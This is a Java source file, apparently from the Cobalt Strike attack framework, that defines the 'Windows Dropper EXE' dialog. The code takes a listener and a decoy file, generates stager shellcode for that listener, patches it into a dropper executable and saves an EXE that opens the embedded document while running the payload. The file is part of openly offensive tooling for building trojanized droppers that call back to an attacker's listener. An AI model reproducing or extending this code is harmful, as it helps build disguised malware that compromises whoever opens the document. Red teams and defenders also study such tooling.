package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import common.ArtifactUtils;
import dialog.*;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class WindowsDropperDialog implements DialogListener,
        SafeDialogCallback {
    protected JFrame dialog = null;
    protected Map options = null;
    protected AggressorClient client;
    protected String file;
    protected String name;
    protected String listener;

    public WindowsDropperDialog(AggressorClient client) {
        this.client = client;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        this.file = options.get("file") + "";
        this.name = options.get("name") + "";
        this.listener = options.get("listener") + "";
        File infile = new File(this.file);
        if (!infile.exists() || this.file.length() == 0) {
            DialogUtils.showError("I need a file to embed to make a dropper");
            return;
        }
        if ("".equals(options.get("name"))) {
            this.name = infile.getName();
        }
        SafeDialogs.saveFile(null, "dropper.exe", this);
    }

    @Override
    public void dialogResult(String outfile) {
        byte[] stager = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), this.listener);
        byte[] sofar = new ArtifactUtils(this.client).patchArtifact(stager, "dropper32.exe");
        new ArtifactUtils(this.client).setupDropper(sofar, this.file, this.name, outfile);
        DialogUtils.showInfo("Saved Windows Dropper EXE to\n" + outfile);
    }

    public void show() {
        this.dialog = DialogUtils.dialog("Windows Dropper EXE", 640, 480);
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        controller.listener("listener", "Listener:", this.client.getConnection(), this.client.getData());
        controller.file("file", "Embedded File:");
        controller.text("name", "File Name:");
        JButton ok = controller.action("Generate");
        JButton help = controller.help("https://www.cobaltstrike.com/help-windows-dropper");
        this.dialog.add(DialogUtils.description("This package creates a Windows document dropper. This package drops a document to disk, opens it, and executes a payload."), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(ok, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

